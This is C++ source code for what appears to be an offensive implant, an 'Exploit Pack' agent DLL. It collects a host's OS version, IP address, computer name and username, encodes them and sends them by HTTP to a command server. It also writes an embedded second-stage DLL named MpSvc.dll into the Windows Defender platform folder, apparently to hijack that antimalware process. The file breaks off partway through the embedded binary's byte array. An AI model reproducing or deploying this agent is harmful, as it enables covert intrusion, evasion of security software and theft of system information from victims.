#include "dllexploit.h"
#include <string>
#include <fstream>
#include <iostream>
#include <string>
#include <vector>
#include <tchar.h>

// Include Syswhispers
#include "common.h"

#include "pch.h"
#include "iostream"
#include "fstream"
#include <intrin.h>
#include <TlHelp32.h>
#include <psapi.h>
#include <lm.h>
#pragma comment(lib, "netapi32.lib") 
#include <vector>
#include <sstream>
#include <thread>
#include <winsock2.h>
#include <WS2tcpip.h>
#pragma comment(lib,"ws2_32.lib")

#include <codecvt>
#include <iostream>
#include <stdexcept>
#include <stdio.h>
#include <string>

using namespace std;
string agentUN = "jsacco";

std::string ProcessIdToName(DWORD processId)
{
    std::string ret;
    HANDLE handle = OpenProcess(
        PROCESS_QUERY_LIMITED_INFORMATION,
        FALSE,
        processId /* This is the PID, you can find one from windows task manager */
    );
    if (handle)
    {
        DWORD buffSize = 1024;
        CHAR buffer[1024];
        if (QueryFullProcessImageNameA(handle, 0, buffer, &buffSize))
        {
            ret = buffer;
        }
        else
        {
            printf("Error GetModuleBaseNameA : %lu", GetLastError());
        }
        CloseHandle(handle);
    }
    else
    {
        printf("Error OpenProcess : %lu", GetLastError());
    }
    return ret;
}

std::string GetProcessUsername(HANDLE* phProcess)
{
    static char sname[300];
    HANDLE tok = 0;
    HANDLE hProcess;
    TOKEN_USER* ptu;
    DWORD nlen, dlen;
    char name[300], dom[300], tubuf[300], * pret = 0;
    int iUse;

    //if phProcess is NULL we get process handle of this
    //process.
    hProcess = phProcess ? *phProcess : GetCurrentProcess();

    //open the processes token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) goto ert;

    //get the SID of the token
    ptu = (TOKEN_USER*)tubuf;
    if (!GetTokenInformation(tok, (TOKEN_INFORMATION_CLASS)1, ptu, 300, &nlen)) goto ert;

    //get the account/domain name of the SID
    dlen = 300;
    nlen = 300;
    if (!LookupAccountSidA(0, ptu->User.Sid, name, &nlen, dom, &dlen, (PSID_NAME_USE)&iUse)) goto ert;


    //copy info to our static buffer
    if (dlen) {
        strcpy_s(sname, dom);
        strcat_s(sname, "");
        strcat_s(sname, name);
    }
    else {
        strcpy_s(sname, name);
    }
    //set our return variable
    pret = sname;

ert:
    if (tok) CloseHandle(tok);
    return name;
}

BOOL TerminateMyProcess(DWORD dwProcessId, UINT uExitCode)
{
    DWORD dwDesiredAccess = PROCESS_TERMINATE;
    BOOL  bInheritHandle = FALSE;
    HANDLE hProcess = OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
    if (hProcess == NULL)
        return FALSE;

    BOOL result = TerminateProcess(hProcess, uExitCode);

    CloseHandle(hProcess);

    return result;
}

static std::string Encode(const std::string data) {
    static constexpr char sEncodingTable[] = {
      'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
      'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
      'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
      'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
      'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
      'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
      'w', 'x', 'y', 'z', '0', '1', '2', '3',
      '4', '5', '6', '7', '8', '9', '+', '/'
    };

    size_t in_len = data.size();
    size_t out_len = 4 * ((in_len + 2) / 3);
    std::string ret(out_len, '\0');
    size_t i;
    char* p = const_cast<char*>(ret.c_str());

    for (i = 0; i < in_len - 2; i += 3) {
        *p++ = sEncodingTable[(data[i] >> 2) & 0x3F];
        *p++ = sEncodingTable[((data[i] & 0x3) << 4) | ((int)(data[i + 1] & 0xF0) >> 4)];
        *p++ = sEncodingTable[((data[i + 1] & 0xF) << 2) | ((int)(data[i + 2] & 0xC0) >> 6)];
        *p++ = sEncodingTable[data[i + 2] & 0x3F];
    }
    if (i < in_len) {
        *p++ = sEncodingTable[(data[i] >> 2) & 0x3F];
        if (i == (in_len - 1)) {
            *p++ = sEncodingTable[((data[i] & 0x3) << 4)];
            *p++ = '=';
        }
        else {
            *p++ = sEncodingTable[((data[i] & 0x3) << 4) | ((int)(data[i + 1] & 0xF0) >> 4)];
            *p++ = sEncodingTable[((data[i + 1] & 0xF) << 2)];
        }
        *p++ = '=';
    }

    return ret;
}

string getLocalIPAddress() {
    // Init WinSock
    WSADATA wsa_Data;
    int wsa_ReturnCode = WSAStartup(0x101, &wsa_Data);
    string localIP;

    // Get the local hostname
    char szHostName[255];
    gethostname(szHostName, 255);
    struct hostent* host_entry;
    host_entry = gethostbyname(szHostName);
    char* szLocalIP;
    szLocalIP = inet_ntoa(*(struct in_addr*)*host_entry->h_addr_list);
    WSACleanup();

    return localIP = szLocalIP;
}

bool GetWinMajorMinorVersion(DWORD& major, DWORD& minor)
{
    bool bRetCode = false;
    LPBYTE pinfoRawData = 0;
    if (NERR_Success == NetWkstaGetInfo(NULL, 100, &pinfoRawData))
    {
        WKSTA_INFO_100* pworkstationInfo = (WKSTA_INFO_100*)pinfoRawData;
        major = pworkstationInfo->wki100_ver_major;
        minor = pworkstationInfo->wki100_ver_minor;
        ::NetApiBufferFree(pinfoRawData);
        bRetCode = true;
    }
    return bRetCode;
}

string GetOSFriendlyName()
{
    std::string     winver;
    OSVERSIONINFOEX osver;
    SYSTEM_INFO     sysInfo;
    typedef void(__stdcall* GETSYSTEMINFO) (LPSYSTEM_INFO);

    __pragma(warning(push))
        __pragma(warning(disable:4996))
        memset(&osver, 0, sizeof(osver));
    osver.dwOSVersionInfoSize = sizeof(osver);
    GetVersionEx((LPOSVERSIONINFO)&osver);
    __pragma(warning(pop))
        DWORD major = 0;
    DWORD minor = 0;
    if (GetWinMajorMinorVersion(major, minor))
    {
        osver.dwMajorVersion = major;
        osver.dwMinorVersion = minor;
    }
    else if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 2)
    {
        OSVERSIONINFOEXW osvi;
        ULONGLONG cm = 0;
        cm = VerSetConditionMask(cm, VER_MINORVERSION, VER_EQUAL);
        ZeroMemory(&osvi, sizeof(osvi));
        osvi.dwOSVersionInfoSize = sizeof(osvi);
        osvi.dwMinorVersion = 3;
        if (VerifyVersionInfoW(&osvi, VER_MINORVERSION, cm))
        {
            osver.dwMinorVersion = 3;
        }
    }

    GETSYSTEMINFO getSysInfo = (GETSYSTEMINFO)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "GetNativeSystemInfo");
    if (getSysInfo == NULL)  getSysInfo = ::GetSystemInfo;
    getSysInfo(&sysInfo);

    if (osver.dwMajorVersion == 10 && osver.dwMinorVersion >= 0 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows 10 Server";
    if (osver.dwMajorVersion == 10 && osver.dwMinorVersion >= 0 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows 10";
    if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 3 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows Server 2012 R2";
    if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 3 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows 8.1";
    if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 2 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows Server 2012";
    if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 2 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows 8";
    if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 1 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows Server 2008 R2";
    if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 1 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows 7";
    if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 0 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows Server 2008";
    if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 0 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows Vista";
    if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 2 && osver.wProductType == VER_NT_WORKSTATION
        && sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)  winver = "Windows XP x64";
    if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 2)   winver = "Windows Server 2003";
    if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 1)   winver = "Windows XP";
    if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 0)   winver = "Windows 2000";
    if (osver.dwMajorVersion < 5)   winver = "unknown";

    if (osver.wServicePackMajor != 0)
    {
        std::string sp;
        char buf[128] = { 0 };
        sp = " Service Pack ";
        sprintf_s(buf, sizeof(buf), "%hd", osver.wServicePackMajor);
        sp.append(buf);
        winver += sp;
    }

    return winver;
}

string getComputerName()
{
    char* temp = 0;
    std::string computerName;

#if defined(WIN32) || defined(_WIN32) || defined(_WIN64)
    temp = getenv("COMPUTERNAME");
    if (temp != 0) {
        computerName = temp;
        temp = 0;
    }
#endif
    return computerName;
}


int sendCMDExecuted(string host, int port, string CookieID, string sendHostUrl, string SendBrowserName, string sendOSType, string ResponseData, string AgentUN, string MyCurrentIP) {
    // Initialize Dependencies to the Windows Socket.
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cout << "WSAStartup failed.\n";
        return -1;
    }

    // We first prepare some "hints" for the "getaddrinfo" function
    // to tell it, that we are looking for a IPv4 TCP Connection.
    struct addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;          // We are targeting IPv4
    hints.ai_protocol = IPPROTO_TCP;    // We are targeting TCP
    hints.ai_socktype = SOCK_STREAM;    // We are targeting TCP so its SOCK_STREAM

    // Aquiring of the IPv4 address of a host using the newer
    // "getaddrinfo" function which outdated "gethostbyname".
    // It will search for IPv4 addresses using the TCP-Protocol.
    struct addrinfo* targetAdressInfo = NULL;
    PCSTR toPCSTR = host.c_str();
    DWORD getAddrRes = getaddrinfo(toPCSTR, NULL, &hints, &targetAdressInfo);
    if (getAddrRes != 0 || targetAdressInfo == NULL)
    {
        MessageBox(0, L"Could not resolve the Host Name", 0, 0);
        WSACleanup();
        return -1;
    }

    // Create the Socket Address Informations, using IPv4
    // We dont have to take care of sin_zero, it is only used to extend the length of SOCKADDR_IN to the size of SOCKADDR
    SOCKADDR_IN sockAddr;
    sockAddr.sin_addr = ((struct sockaddr_in*)targetAdressInfo->ai_addr)->sin_addr;    // The IPv4 Address from the Address Resolution Result
    sockAddr.sin_family = AF_INET;  // IPv4
    sockAddr.sin_port = htons(port);  // HTTP Port: 8000

    // We have to free the Address-Information from getaddrinfo again
    freeaddrinfo(targetAdressInfo);

    // Creation of a socket for the communication with the Web Server,
    // using IPv4 and the TCP-Protocol
    SOCKET webSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (webSocket == INVALID_SOCKET)
    {
        MessageBox(0, L"Creation of the Socket Failed", 0, 0);
        WSACleanup();
        return -1;
    }

    BOOL bOptVal = TRUE;
    int bOptLen = sizeof(BOOL);
    setsockopt(webSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&bOptVal, bOptLen);

    if (connect(webSocket, (SOCKADDR*)&sockAddr, sizeof(sockAddr)) != 0)
    {
        MessageBox(0, L"Could not connect", 0, 0);
        closesocket(webSocket);
        WSACleanup();
        return -1;
    }

    string request = CookieID + "&" + sendHostUrl + "&" + SendBrowserName + "&" + sendOSType + "&" + ResponseData + "&1&" + AgentUN + "&" + getLocalIPAddress();
    string encoded_request = Encode(request);
    char text[2048];

    // Sending a HTTP-GET-Request to the Server
    string request_craft = "GET /agent/&" + encoded_request + " HTTP/1.1\r\nHost:" + host + "\r\nConnection: close\r\n\r\n";
    const char* httpRequest = request_craft.c_str();

    int sentBytes = send(webSocket, httpRequest, strlen(httpRequest), 0);
    if (sentBytes < strlen(httpRequest) || sentBytes == SOCKET_ERROR)
    {
        MessageBox(0, L"Could not send the request to the Server", 0, 0);
        closesocket(webSocket);
        WSACleanup();
        return -1;
    }

    // Cleaning up Windows Socket Dependencies
    closesocket(webSocket);
    WSACleanup();

    return 0;
}

int sendInitialData(string host, int port, string CookieID, string sendHostUrl, string SendBrowserName, string sendOSType, string ResponseData, string AgentUN, string MyCurrentIP, DWORD processID, HANDLE phProcess, string proccesName) {
    // Initialize Dependencies to the Windows Socket.
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cout << "WSAStartup failed.\n";
        return -1;
    }

    // We first prepare some "hints" for the "getaddrinfo" function
    // to tell it, that we are looking for a IPv4 TCP Connection.
    struct addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;          // We are targeting IPv4
    hints.ai_protocol = IPPROTO_TCP;    // We are targeting TCP
    hints.ai_socktype = SOCK_STREAM;    // We are targeting TCP so its SOCK_STREAM

    // Aquiring of the IPv4 address of a host using the newer
    // "getaddrinfo" function which outdated "gethostbyname".
    // It will search for IPv4 addresses using the TCP-Protocol.
    struct addrinfo* targetAdressInfo = NULL;
    PCSTR toPCSTR = host.c_str();
    DWORD getAddrRes = getaddrinfo(toPCSTR, NULL, &hints, &targetAdressInfo);
    if (getAddrRes != 0 || targetAdressInfo == NULL)
    {
        MessageBox(0, L"Could not resolve the Host Name", 0, 0);
        WSACleanup();
        return -1;
    }

    // Create the Socket Address Informations, using IPv4
    // We dont have to take care of sin_zero, it is only used to extend the length of SOCKADDR_IN to the size of SOCKADDR
    SOCKADDR_IN sockAddr;
    sockAddr.sin_addr = ((struct sockaddr_in*)targetAdressInfo->ai_addr)->sin_addr;    // The IPv4 Address from the Address Resolution Result
    sockAddr.sin_family = AF_INET;  // IPv4
    sockAddr.sin_port = htons(port);  // HTTP Port: 8000

    // We have to free the Address-Information from getaddrinfo again
    freeaddrinfo(targetAdressInfo);

    // Creation of a socket for the communication with the Web Server,
    // using IPv4 and the TCP-Protocol
    SOCKET webSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (webSocket == INVALID_SOCKET)
    {
        MessageBox(0, L"Creation of the Socket Failed", 0, 0);
        WSACleanup();
        return -1;
    }

    BOOL bOptVal = TRUE;
    int bOptLen = sizeof(BOOL);
    setsockopt(webSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&bOptVal, bOptLen);

    if (connect(webSocket, (SOCKADDR*)&sockAddr, sizeof(sockAddr)) != 0)
    {
        MessageBox(0, L"Could not connect", 0, 0);
        closesocket(webSocket);
        WSACleanup();
        return -1;
    }

    string initialData;
    initialData = "\nExploit Pack agent connected.\nOperating system: "  + GetOSFriendlyName() + "\n" + "Local IP : " + getLocalIPAddress() + "\n" + "Hiding in process: " + proccesName + "\nPPL: PsProtectedSignerWinTcb-Light" + "\nWrite/Read access : " + ProcessIdToName(processID) + "\n" + "Privileges: " + GetProcessUsername(NULL) + "\n" + "PPL: PsProtectedSignerAntimalware-Light";

    string request = CookieID + "&" + sendHostUrl + "&" + SendBrowserName + "&" + sendOSType + "&" + initialData + "&1&" + AgentUN + "&" + getLocalIPAddress();
    string encoded_request = Encode(request);
    char text[2048];

    // Sending a HTTP-GET-Request to the Server
    string request_craft = "GET /agent/&" + encoded_request + " HTTP/1.1\r\nHost:" + host + "\r\nConnection: close\r\n\r\n";
    const char* httpRequest = request_craft.c_str();

    int sentBytes = send(webSocket, httpRequest, strlen(httpRequest), 0);
    if (sentBytes < strlen(httpRequest) || sentBytes == SOCKET_ERROR)
    {
        MessageBox(0, L"Could not send the request to the Server", 0, 0);
        closesocket(webSocket);
        WSACleanup();
        return -1;
    }

    // Cleaning up Windows Socket Dependencies
    closesocket(webSocket);
    WSACleanup();

    return 0;
}

int sendResults(string host, int port, string CookieID, string sendHostUrl, string SendBrowserName, string sendOSType, string ResponseData, string AgentUN, string MyCurrentIP) {
    // Initialize Dependencies to the Windows Socket.
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cout << "WSAStartup failed.\n";
        return -1;
    }

    // We first prepare some "hints" for the "getaddrinfo" function
    // to tell it, that we are looking for a IPv4 TCP Connection.
    struct addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;          // We are targeting IPv4
    hints.ai_protocol = IPPROTO_TCP;    // We are targeting TCP
    hints.ai_socktype = SOCK_STREAM;    // We are targeting TCP so its SOCK_STREAM

    // Aquiring of the IPv4 address of a host using the newer
    // "getaddrinfo" function which outdated "gethostbyname".
    // It will search for IPv4 addresses using the TCP-Protocol.
    struct addrinfo* targetAdressInfo = NULL;
    PCSTR toPCSTR = host.c_str();
    DWORD getAddrRes = getaddrinfo(toPCSTR, NULL, &hints, &targetAdressInfo);
    if (getAddrRes != 0 || targetAdressInfo == NULL)
    {
        MessageBox(0, L"Could not resolve the Host Name", 0, 0);
        WSACleanup();
        return -1;
    }

    // Create the Socket Address Informations, using IPv4
    // We dont have to take care of sin_zero, it is only used to extend the length of SOCKADDR_IN to the size of SOCKADDR
    SOCKADDR_IN sockAddr;
    sockAddr.sin_addr = ((struct sockaddr_in*)targetAdressInfo->ai_addr)->sin_addr;    // The IPv4 Address from the Address Resolution Result
    sockAddr.sin_family = AF_INET;  // IPv4
    sockAddr.sin_port = htons(port);  // HTTP Port: 8000

    // We have to free the Address-Information from getaddrinfo again
    freeaddrinfo(targetAdressInfo);

    // Creation of a socket for the communication with the Web Server,
    // using IPv4 and the TCP-Protocol
    SOCKET webSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (webSocket == INVALID_SOCKET)
    {
        MessageBox(0, L"Creation of the Socket Failed", 0, 0);
        WSACleanup();
        return -1;
    }

    BOOL bOptVal = TRUE;
    int bOptLen = sizeof(BOOL);
    setsockopt(webSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&bOptVal, bOptLen);

    if (connect(webSocket, (SOCKADDR*)&sockAddr, sizeof(sockAddr)) != 0)
    {
        MessageBox(0, L"Could not connect", 0, 0);
        closesocket(webSocket);
        WSACleanup();
        return -1;
    }

    string request = CookieID + "&" + sendHostUrl + "&" + SendBrowserName + "&" + sendOSType + "&" + ResponseData + "&1&" + AgentUN + "&" + getLocalIPAddress();
    string encoded_request = Encode(request);
    char text[2048];

    // Sending a HTTP-GET-Request to the Server
    string request_craft = "GET /agent/&" + encoded_request + " HTTP/1.1\r\nHost:" + host + "\r\nConnection: close\r\n\r\n";
    const char* httpRequest = request_craft.c_str();

    int sentBytes = send(webSocket, httpRequest, strlen(httpRequest), 0);
    if (sentBytes < strlen(httpRequest) || sentBytes == SOCKET_ERROR)
    {
        MessageBox(0, L"Could not send the request to the Server", 0, 0);
        closesocket(webSocket);
        WSACleanup();
        return -1;
    }

    // Cleaning up Windows Socket Dependencies
    closesocket(webSocket);
    WSACleanup();

    return 0;
}

void Payload()
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char text[] = "calc.exe";
    wchar_t wtext[20];
    mbstowcs(wtext, text, strlen(text) + 1);//Plus null
    LPWSTR ptr = wtext;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    CreateProcess(NULL, ptr, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

string readFile2(const string& fileName)
{
    ifstream ifs(fileName.c_str(), ios::in | ios::binary | ios::ate);

    ifstream::pos_type fileSize = ifs.tellg();
    ifs.seekg(0, ios::beg);

    vector<char> bytes(fileSize);
    ifs.read(bytes.data(), fileSize);
    
    ifs.close();
    return string(bytes.data(), fileSize);
}

int DropDLL() {
    // Drop a DLL as a second stage
    std::ofstream myfile2;
    myfile2.open("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MpSvc.dll", std::ios::out | std::ios::binary);
    char buffer[32256] = { 0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xF0, 0x00, 0x00, 0x00, 0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD,	0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68, 0x69, 0x73, 0x20, 0x70,	0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F,	0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20,	0x44, 0x4F, 0x53, 0x20, 0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A,	0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFA, 0xDC, 0x85, 0x7D,	0xBE, 0xBD, 0xEB, 0x2E, 0xBE, 0xBD, 0xEB, 0x2E, 0xBE, 0xBD, 0xEB, 0x2E,	0xB7, 0xC5, 0x78, 0x2E, 0xB4, 0xBD, 0xEB, 0x2E, 0x00, 0xCC, 0xEF, 0x2F,	0xB6, 0xBD, 0xEB, 0x2E, 0x00, 0xCC, 0xE8, 0x2F, 0xBD, 0xBD, 0xEB, 0x2E,	0x00, 0xCC, 0xEE, 0x2F, 0xAF, 0xBD, 0xEB, 0x2E, 0x00, 0xCC, 0xEA, 0x2F,	0xB8, 0xBD, 0xEB, 0x2E, 0xE5, 0xD5, 0xEA, 0x2F, 0xBB, 0xBD, 0xEB, 0x2E,	0xBE, 0xBD, 0xEA, 0x2E, 0xC5, 0xBD, 0xEB, 0x2E, 0x26, 0xCF, 0xE2, 0x2F,	0xBC, 0xBD, 0xEB, 0x2E, 0x26, 0xCF, 0x14, 0x2E, 0xBF, 0xBD, 0xEB, 0x2E,	0x26, 0xCF, 0xE9, 0x2F, 0xBF, 0xBD, 0xEB, 0x2E, 0x52, 0x69, 0x63, 0x68,	0xBE, 0xBD, 0xEB, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x06, 0x00, 0xFC, 0xBE, 0x91, 0x60,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x00, 0x22, 0x20,	0x0B, 0x02, 0x0E, 0x1C, 0x00, 0x40, 0x00, 0x00, 0x00, 0x42, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x14, 0x40, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,	0x00, 0x00, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,	0x00, 0x02, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00,	0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x60, 0x01,	0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x1C, 0x6A, 0x00, 0x00, 0xDC, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x00, 0x00,	0xF8, 0x00, 0x00, 0x00, 0x00, 0x90, 0x00, 0x00, 0x7C, 0x05, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB0, 0x00, 0x00,	0x88, 0x00, 0x00, 0x00, 0x40, 0x56, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xB0, 0x56, 0x00, 0x00, 0x38, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x40, 0x03, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00, 0x03, 0x3F, 0x00, 0x00,	0x00, 0x10, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x20, 0x00, 0x00, 0x60, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,	0x16, 0x2B, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0x2C, 0x00, 0x00,	0x00, 0x44, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40, 0x2E, 0x64, 0x61, 0x74,	0x61, 0x00, 0x00, 0x00, 0x20, 0x0A, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00,	0x00, 0x04, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xC0,	0x2E, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x7C, 0x05, 0x00, 0x00,	0x00, 0x90, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x74, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x40, 0x00, 0x00, 0x40, 0x2E, 0x72, 0x73, 0x72, 0x63, 0x00, 0x00, 0x00,	0xF8, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,	0x00, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40, 0x2E, 0x72, 0x65, 0x6C,	0x6F, 0x63, 0x00, 0x00, 0x88, 0x00, 0x00, 0x00, 0x00, 0xB0, 0x00, 0x00,	0x00, 0x02, 0x00, 0x00, 0x00, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x42,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 